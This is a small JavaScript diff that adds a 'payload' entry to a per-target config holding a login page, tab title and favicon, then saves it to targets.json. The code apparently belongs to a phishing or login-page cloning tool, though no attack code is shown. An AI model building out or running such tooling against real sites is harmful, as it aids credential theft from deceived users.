@@ -82,7 +82,8 @@ var favicon_url = '';
   config[short_name] = {
     login_page: login_page, 
     tab_title: title,
-    favicon: `${short_name}.ico`
+    favicon: `${short_name}.ico`,
+    payload: `payload.txt`,
   }
   fs.writeFileSync(`./targets.json`,`${JSON.stringify(config, null, 2)}`)
 
